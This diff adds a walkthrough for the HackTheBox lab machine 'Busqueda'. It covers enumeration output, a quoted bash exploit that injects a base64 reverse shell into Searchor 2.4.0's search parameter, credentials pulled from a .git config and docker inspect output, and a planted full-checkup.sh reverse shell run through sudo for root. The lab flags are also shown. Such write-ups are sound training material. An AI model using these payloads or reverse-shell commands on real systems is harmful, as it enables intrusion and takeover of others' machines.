@@ -1,0 +1,564 @@
+---
+title: Busqueda
+description: Python command injection via Searchor 2.4.0, privilege escalation through relative path execution.
+---
+
+**Platform:** HackTheBox  
+**Difficulty:** Easy  
+**OS:** Linux
+
+---
+
+## Reconnaissance
+
+> Goal: Identify exposed services and attack surface.
+> 
+- Confirm the host is reachable.
+<details>
+<summary><strong>Ping - host reachability</strong></summary>
+
+    ```bash
+    ╭─ ~/Cyber_Course/HackTheBox/Machines/Busqueda
+    ╰─❯ ping 10.129.228.217
+    PING 10.129.228.217 (10.129.228.217) 56(84) bytes of data.
+    64 bytes from 10.129.228.217: icmp_seq=1 ttl=63 time=81.8 ms
+    64 bytes from 10.129.228.217: icmp_seq=2 ttl=63 time=81.6 ms
+    64 bytes from 10.129.228.217: icmp_seq=3 ttl=63 time=79.6 ms
+    64 bytes from 10.129.228.217: icmp_seq=4 ttl=63 time=80.8 ms
+    ^C
+    --- 10.129.228.217 ping statistics ---
+    4 packets transmitted, 4 received, 0% packet loss, time 3010ms
+    rtt min/avg/max/mdev = 79.593/80.953/81.800/0.866 ms
+    ```
+
+</details>
+    
+- Find all availiable ports
+<details>
+<summary><strong>Nmap - Full TCP scan</strong></summary>
+
+    ```bash
+    ╭─ ~/Cyber_Course/HackTheBox/Machines/Busqueda
+    ╰─❯ nmap -sC -sV 10.129.228.217
+    Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-12 20:37 -0400
+    Nmap scan report for 10.129.228.217
+    Host is up (0.087s latency).
+    Not shown: 998 closed tcp ports (reset)
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
+    |_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
+    80/tcp open  http    Apache httpd 2.4.52
+    |_http-title: Did not follow redirect to http://searcher.htb/
+    |_http-server-header: Apache/2.4.52 (Ubuntu)
+    Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 16.40 seconds
+    ```
+
+</details>
+<details>
+<summary><strong>Nmap - Aggressive scan</strong></summary>
+
+    ```bash
+    ╭─ ~/Cyber_Course/HackTheBox/Machines/Busqueda
+    ╰─❯ nmap -A 10.129.228.217
+    Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-12 20:39 -0400
+    Nmap scan report for 10.129.228.217
+    Host is up (0.097s latency).
+    Not shown: 998 closed tcp ports (reset)
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
+    |_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
+    80/tcp open  http    Apache httpd 2.4.52
+    |_http-server-header: Apache/2.4.52 (Ubuntu)
+    |_http-title: Did not follow redirect to http://searcher.htb/
+    Device type: general purpose
+    Running: Linux 5.X
+    OS CPE: cpe:/o:linux:linux_kernel:5
+    OS details: Linux 5.0 - 5.14
+    Network Distance: 2 hops
+    Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    
+    TRACEROUTE (using port 80/tcp)
+    HOP RTT      ADDRESS
+    1   77.43 ms 10.10.14.1
+    2   93.19 ms 10.129.228.217
+    
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 18.58 seconds
+    ```
+
+</details>
+    
+
+**🟥 Key findings**
+
+- **Port 80 -** Apache Web Server
+- **Port 22** - SSH
+
+---
+
+## DNS & Web Enumeration
+
+> Goal: Identify virtual hosts and domain-related misconfigurations.
+> 
+- Let's map hostname to IP address using `/etc/hosts`
+
+```bash
+╭─ ~/Cyber_Course/HackTheBox/Machines/Busqueda
+╰─❯ sudo nano /etc/hosts
+[sudo] password for idan_linux: 
+# Add the Following line
+10.129.228.217  searcher.htb    gitea.searcher.htb 
+```
+
+Going over to the website [searcher.htb](http://searcher.htb) we get the following
+
+![image.png](/images/hackthebox/Busqueda/Busqueda-image-1.png)
+
+We found an Apache web server exposed on port 80, so naturally the next step was enumeration. We ran tools like `feroxbuster` to discover hidden directories, `nikto` to check for common vulnerabilities, and `whatweb` to fingerprint the technologies behind the site.
+<details>
+<summary>Running <code>feroxbuster</code></summary>
+
+    ```bash
+    ╭─ ~/Cyber_Course/HackTheBox/Machines/Busqueda
+    ╰─❯ feroxbuster --url http://searcher.htb/ -q -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --insecure -C 404 -o feroxscan
+                                                                                       404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                               405      GET        5l       20w      153c http://searcher.htb/search
+    200      GET      430l      751w    13519c http://searcher.htb/
+    403      GET        9l       28w      277c http://searcher.htb/server-status
+    ```
+
+</details>
+<details>
+<summary>Running <code>Nikto</code></summary>
+
+    ```bash
+    ╭─ ~/C/HackTheBox/Machines/Busqueda
+    ╰─❯ nikto -h http://searcher.htb -Tuning 2 -maxtime 300
+    - Nikto v2.6.0
+    ---------------------------------------------------------------------------
+    + Your Nikto installation is out of date.
+    + Target IP:          10.129.228.217
+    + Target Hostname:    searcher.htb
+    + Target Port:        80
+    + Platform:           Windows
+    + Start Time:         2026-04-12 21:17:31 (GMT-4)
+    ---------------------------------------------------------------------------
+    + Server: Werkzeug/2.1.2 Python/3.10.6
+    + No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
+    + [999962] /: Server banner changed from 'Werkzeug/2.1.2 Python/3.10.6' to 'Apache/2.4.52 (Ubuntu)'.
+    + [013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
+    + [013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
+    + [013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+    + [013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+    + [013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy                                                                                                   + [600652] Python/3.10.6 appears to be outdated (current is at least 3.13.1).
+    + [999990] OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS .
+    + [007342] /: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors directive. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Frame-Options
+    + [007352] /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+    + 1333 requests: 0 errors and 10 items reported on the remote host
+    + End Time:           2026-04-12 21:19:34 (GMT-4) (123 seconds)
+    ---------------------------------------------------------------------------
+    + 1 host(s) tested
+    ```
+
+</details>
+<details>
+<summary>Running <code>whatweb</code></summary>
+
+    ```bash
+    ╭─ ~/C/HackTheBox/Machines/Busqueda
+    ╰─❯ whatweb -a 3 http://searcher.htb
+    http://searcher.htb [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.129.228.217], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
+    ```
+
+</details>
+    
+
+## Exploitation
+
+> Goal: Abuse application vulnerabilities to gain deeper access
+> 
+
+We identified a `/search` endpoint on the application. When attempting to access it directly via a GET request, the server responded with a `405 Method Not Allowed`, indicating that the endpoint exists but only accepts specific HTTP methods.
+
+Let’s explore further with `BurpSuite` 
+
+![image.png](/images/hackthebox/Busqueda/Busqueda-image-2.png)
+
+We notice the website is powered by a custom Python libary called `Searchor 2.4.0`
+
+ https://github.com/ArjunSharda/Searchor 
+
+Searching around in Github we found that version has a vulnerability
+
+ https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/
+
+![image.png](/images/hackthebox/Busqueda/Busqueda-image-3.png)
+<details>
+<summary><strong>Reproducing The Attack</strong></summary>
+
+    ```bash
+    **### Exploit Code:**
+    
+    #!/bin/bash -
+    
+    default_port="9001"
+    port="${3:-$default_port}"
+    rev_shell_b64=$(echo -ne "bash  -c 'bash -i >& /dev/tcp/$2/${port} 0>&1'" | base64)
+    evil_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) # junky comment"
+    plus="+"
+    
+    echo "---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---"
+    
+    if [ -z "${evil_cmd##*$plus*}" ]
+    then
+        evil_cmd=$(echo ${evil_cmd} | sed -r 's/[+]+/%2B/g')
+    fi
+    
+    if [ $# -ne 0 ]
+    then
+        echo "[*] Input target is $1"
+        echo "[*] Input attacker is $2:${port}"
+        echo "[*] Run the Reverse Shell... Press Ctrl+C after successful connection"
+        curl -s -X POST $1/search -d "engine=Google&query=${evil_cmd}" 1> /dev/null
+    else 
+        echo "[!] Please specify a IP address of target and IP address/Port of attacker for Reverse Shell, for example: 
+    
+    ./exploit.sh <TARGET> <ATTACKER> <PORT> [9001 by default]"
+    fi
+    
+    ╭─ ~/Cyber_Course/HackTheBox/Machines/Busqueda 
+    ╰─❯ nc -lvnp 9001
+    
+    ╭─ ~/Cyber_Course/HackTheBox/Machines/Busqueda
+    ╰─❯ ./exploit.sh http://searcher.htb 10.10.14.87
+    ---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
+    [*] Input target is http://searcher.htb
+    [*] Input attacker is 10.10.14.87:9001
+    [*] Run the Reverse Shell... Press Ctrl+C after successful connection
+    
+    connect to [10.10.14.87] from (UNKNOWN) [10.129.228.217] 57982
+    bash: cannot set terminal process group (1561): Inappropriate ioctl for device
+    bash: no job control in this shell
+    svc@busqueda:/var/www/app$ whoami
+    whoami
+    svc
+    svc@busqueda:/var/www/app$
+    ```
+
+</details>
+    
+
+![image.png](/images/hackthebox/Busqueda/Busqueda-image-4.png)
+
+## Initial Access
+
+> Goal: Gain authenticated access to the application
+> 
+<details>
+<summary><strong>Commands as user <code>svc</code></strong></summary>
+
+    ```bash
+    svc@busqueda:/var/www/app$ whoami
+    whoami
+    svc
+    svc@busqueda:/var/www/app$ cd /home
+    cd /home
+    svc@busqueda:/home$ ls
+    ls
+    svc
+    svc@busqueda:/home$ ls -la
+    ls -la
+    total 12
+    drwxr-xr-x  3 root root 4096 Dec 22  2022 .
+    drwxr-xr-x 19 root root 4096 Mar  1  2023 ..
+    drwxr-x---  4 svc  svc  4096 Apr  3  2023 svc
+    svc@busqueda:/home$ cd svc
+    cd svc
+    svc@busqueda:~$ ls
+    ls
+    user.txt
+    svc@busqueda:~$ cat user.txt
+    cat user.txt
+    2d742121744d37137177a940d19195e3
+    ```
+
+</details>
+    
+
+**🟥 Key findings**
+
+- User `svc`
+- Logged in as user `svc`
+
+---
+
+### Task 1
+
+- Submit User Flag
+    
+    <aside>
+    💡
+    
+    2d742121744d37137177a940d19195e3
+    
+    </aside>
+    
+
+---
+
+## Privilege Escalation
+
+> Goal: Exploit misconfigurations to gain higher‑level access to the system
+> 
+<details>
+<summary>Searching .git folder for config files</summary>
+
+    ```bash
+    svc@busqueda:/var/www/app$ ls -la
+    total 20
+    drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
+    drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
+    -rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
+    drwxr-xr-x 8 www-data www-data 4096 Apr 13 00:32 .git
+    drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
+    svc@busqueda:/var/www/app$ cd .git
+    svc@busqueda:/var/www/app/.git$ ls -la
+    total 52
+    drwxr-xr-x 8 www-data www-data 4096 Apr 13 00:32 .
+    drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 ..
+    drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches
+    -rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
+    -rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
+    -rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
+    -rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
+    drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks
+    -rw-r--r-- 1 root     root      259 Apr  3  2023 index
+    drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info
+    drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs
+    drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects
+    drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs
+    svc@busqueda:/var/www/app/.git$ cat config
+    [core]
+     repositoryformatversion = 0
+     filemode = true
+     bare = false
+     logallrefupdates = true
+    [remote "origin"]
+     url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+     fetch = +refs/heads/*:refs/remotes/origin/*
+    [branch "main"]
+     remote = origin
+     merge = refs/heads/main
+    ```
+
+</details>
+    
+
+Let's map hostname to IP address using `/etc/hosts` 
+
+![image.png](/images/hackthebox/Busqueda/Busqueda-image-5.png)
+
+![image.png](/images/hackthebox/Busqueda/Busqueda-image-6.png)
+
+**🟥 Key findings**
+
+- User `svc` Password `jh1usoih2bkjaspwe92`
+- User `cody` Password `jh1usoih2bkjaspwe92`
+- User `administrator`
+
+---
+<details>
+<summary><strong>Checking User <code>svc</code> Perms</strong></summary>
+
+    ```bash
+    svc@busqueda:/var/www/app/.git$ sudo -l
+    [sudo] password for svc:
+    Matching Defaults entries for svc on busqueda:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+    
+    User svc may run the following commands on busqueda:
+        (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+    ```
+
+</details>
+<details>
+<summary><strong>Exploring Attack Vector</strong></summary>
+
+    ```bash
+    svc@busqueda:/var/www/app/.git$ ls -la /opt/scripts/system-checkup.py
+    -rwx--x--x 1 root root 1903 Dec 24  2022 /opt/scripts/system-checkup.py
+    svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py --help
+    Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
+    
+         docker-ps     : List running docker containers
+         docker-inspect : Inpect a certain docker container
+         full-checkup  : Run a full system checkup
+    
+    svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+    CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS       PORTS                                             NAMES
+    960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 years ago   Up 4 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
+    f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 years ago   Up 4 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
+    ```
+
+</details>
+    
+
+We referenced the Docker documentation for `docker inspect` to better understand container configuration details and available output fields.
+
+https://docs.docker.com/reference/cli/docker/inspect/
+<details>
+<summary><strong>Exploring Attack Vector #2</strong></summary>
+
+    ```bash
+    svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' gitea
+    --format={"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
+    
+    **# Back in our Kali**
+    
+    ╭─ ~/Cyber_Course/HackTheBox/Machines/Busqueda
+    ╰─❯ echo -n '{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}' | jq
+    {
+      "Hostname": "960873171e2e",
+      "Domainname": "",
+      "User": "",
+      "AttachStdin": false,
+      "AttachStdout": false,
+      "AttachStderr": false,
+      "ExposedPorts": {
+        "22/tcp": {},
+        "3000/tcp": {}
+      },
+      "Tty": false,
+      "OpenStdin": false,
+      "StdinOnce": false,
+      "Env": [
+        "USER_UID=115",
+        "USER_GID=121",
+        "GITEA__database__DB_TYPE=mysql",
+        "GITEA__database__HOST=db:3306",
+        "GITEA__database__NAME=gitea",
+        "GITEA__database__USER=gitea",
+        "GITEA__database__PASSWD=**yuiu1hoiu4i5ho1uh**",
+        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+        "USER=git",
+        "GITEA_CUSTOM=/data/gitea"
+      ],
+      "Cmd": [
+        "/bin/s6-svscan",
+        "/etc/s6"
+      ],
+      "Image": "gitea/gitea:latest",
+      "Volumes": {
+        "/data": {},
+        "/etc/localtime": {},
+        "/etc/timezone": {}
+      },
+      "WorkingDir": "",
+      "Entrypoint": [
+        "/usr/bin/entrypoint"
+      ],
+      "OnBuild": null,
+      "Labels": {
+        "com.docker.compose.config-hash": "e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515",
+        "com.docker.compose.container-number": "1",
+        "com.docker.compose.oneoff": "False",
+        "com.docker.compose.project": "docker",
+        "com.docker.compose.project.config_files": "docker-compose.yml",
+        "com.docker.compose.project.working_dir": "/root/scripts/docker",
+        "com.docker.compose.service": "server",
+        "com.docker.compose.version": "1.29.2",
+        "maintainer": "maintainers@gitea.io",
+        "org.opencontainers.image.created": "2022-11-24T13:22:00Z",
+        "org.opencontainers.image.revision": "9bccc60cf51f3b4070f5506b042a3d9a1442c73d",
+        "org.opencontainers.image.source": "https://github.com/go-gitea/gitea.git",
+        "org.opencontainers.image.url": "https://github.com/go-gitea/gitea"
+      }
+    }
+    
+    ```
+
+</details>
+    
+
+![image.png](/images/hackthebox/Busqueda/Busqueda-image-7.png)
+
+**🟥 Key findings**
+
+- User `gitea` Password `yuiu1hoiu4i5ho1uh`
+- User `administrator` Password `yuiu1hoiu4i5ho1uh`
+
+---
+
+We continued examining scripts owned by the “administrator” user and identified a Python script `system-checkup.py`that calls a local script during execution.
+
+Within the `full-checkup` action, the script executes a relative file path:
+
+```python
+elif action == 'full-checkup': 
+	try: arg_list = ['./full-checkup.sh'] 
+		print(run_command(arg_list)) 
+		print('[+] Done!') 
+	except: 
+		print('Something went wrong') exit(1)
+```
+
+This indicates that the program relies on a **relative path execution** for `full-checkup.sh`, meaning the script is executed from the current working directory rather than using an absolute path.
+<details>
+<summary><strong>Exploiting The Vulnerability</strong></summary>
+
+    ```bash
+    svc@busqueda:~$ echo -e '#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.10.14.87/4444 0>&1' > full-checkup.sh;chmod +x full-checkup.sh
+    svc@busqueda:~$ cat full-checkup.sh
+    #!/bin/bash
+    /bin/bash -i >& /dev/tcp/10.10.14.87/4444 0>&1
+    svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+    
+    # In our Kali:
+    ╭─ ~/Cyber_Course/HackTheBox/Machines/Busqueda
+    ╰─❯ penelope -p 4444
+    [+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.0.2.4 • 10.10.14.87
+    ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+    [+] Got reverse shell from busqueda~10.129.228.217-Linux-x86_64 😍️ Assigned SessionID <1>
+    [+] Attempting to upgrade shell to PTY...
+    [+] Shell upgraded successfully using /usr/bin/python3! 💪
+    [+] Interacting with session [1], Shell Type: PTY, Menu key: F12
+    [+] Logging to /home/idan_linux/.penelope/sessions/busqueda~10.129.228.217-Linux-x86_64/2026_04_13-01_07_13-673.log 📜
+    ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+    root@busqueda:/home/svc#
+    ```
+
+</details>
+<details>
+<summary>Commands as <code>root</code></summary>
+
+    ```bash
+    root@busqueda:/home/svc# whoami
+    root
+    root@busqueda:/home/svc# cd /root
+    root@busqueda:~# ls
+    ecosystem.config.js  root.txt  scripts  snap
+    root@busqueda:~# cat root.txt
+    3527d47d75482a5285afe6b132750aba
+    ```
+
+</details>
+    
+
+### Task 2
+
+- Submit Root Flag
+    
+    <aside>
+    💡 
+    3527d47d75482a5285afe6b132750aba
+    
+    </aside>
+    
+
+---
